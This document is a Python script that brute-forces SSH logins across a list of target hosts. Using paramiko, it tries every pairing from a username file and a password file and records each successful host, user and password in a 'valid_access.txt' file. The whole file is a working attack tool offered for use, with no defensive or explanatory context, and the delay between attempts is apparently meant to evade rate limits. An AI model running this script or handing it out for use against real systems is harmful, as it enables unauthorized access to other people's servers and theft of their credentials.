import subprocess
import os
import time
from tqdm import tqdm
import paramiko

username_list = "usernames.txt"
password_list = "passwords.lst"
target_list = "done.lst"
output_file = "valid_access.txt"
delay_seconds = 5

with open(target_list, "r") as f:
    targets = f.readlines()
    targets = [t.strip() for t in targets]

for target in targets:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for user in open(username_list, 'r').readlines():
        user = user.strip()
        for password in open(password_list, 'r').readlines():
            password = password.strip()

            try:
                ssh.connect(target, username=user, password=password, timeout=10)
                print(f"{target} -> {user}:{password} succeeded!")
                with open(output_file, "a") as f:
                    f.write(f"{target} -> {user}:{password}\n")
            except:
                print(f"{target} -> {user}:{password} failed.")

            time.sleep(delay_seconds)

            # Print progress bar
            progress = f"Target: {target}, User: {user}, Password: {password}"
            with tqdm(total=1, desc=progress, position=0, leave=True) as pbar:
                pbar.update()

    ssh.close()
